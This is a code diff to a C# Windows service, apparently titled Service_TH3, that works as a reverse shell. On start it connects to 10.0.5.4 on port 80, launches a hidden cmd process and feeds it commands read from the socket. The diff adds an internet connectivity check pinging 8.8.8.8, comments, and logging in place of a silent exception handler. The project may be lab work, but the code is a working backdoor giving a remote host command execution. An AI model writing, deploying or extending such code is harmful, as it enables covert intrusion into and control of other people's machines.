@@ -5,6 +5,7 @@ using System.Data;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.ServiceProcess;
 using System.Text;
@@ -24,10 +25,18 @@ namespace Service_TH3
         protected override void OnStart(string[] args)
         {
             WriteToFile("Service start  " + DateTime.Now);
+            if (IsConnectedToInternet())
+            {
+                WriteToFile("Internet access " + DateTime.Now);
+            }
+            else
+            {
+                WriteToFile("No Internet access " + DateTime.Now);
+            }
 
             try
             {
-                using (TcpClient client = new TcpClient("10.0.5.4", 80))
+                using (TcpClient client = new TcpClient("10.0.5.4", 80))    //Establish http connection with port 80.
                 {
                     using (Stream stream = client.GetStream())
                     {
@@ -37,7 +46,7 @@ namespace Service_TH3
 
                             StringBuilder strInput = new StringBuilder();
 
-                            Process p = new Process();
+                            Process p = new Process();      //Create new Process.
                             p.StartInfo.FileName = "cmd";
                             p.StartInfo.CreateNoWindow = true;
                             p.StartInfo.UseShellExecute = false;
@@ -47,13 +56,13 @@ namespace Service_TH3
                             p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                             p.Start();
                             p.BeginOutputReadLine();
-                            WriteToFile("Service start server " + DateTime.Now);
+                            
                             while (true)
                             {
                                 
                                 strInput.Append(rdr.ReadLine());
                                 //strInput.Append("\n");
-                                p.StandardInput.WriteLine(strInput);
+                                p.StandardInput.WriteLine(strInput);    
                                 strInput.Remove(0, strInput.Length);
                             }
 
@@ -64,8 +73,8 @@ namespace Service_TH3
             }
             catch (Exception ex)
             {
-                // silence is golden
-         
+                WriteToFile("Couldn't connect " + DateTime.Now);
+
             }
         }
 
@@ -91,6 +100,20 @@ namespace Service_TH3
         {
         }
 
+        public bool IsConnectedToInternet() // Check Internet connection 
+        {
+            string host = "8.8.8.8";    //Ping to DNS Google.
+            bool res = false;
+            Ping p = new Ping();
+            try
+            {
+                PingReply reply = p.Send(host);
+                if (reply.Status == IPStatus.Success)
+                    return true;
+            }
+            catch { }
+            return res;
+        }
         public void WriteToFile(string Message)
         {
             string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
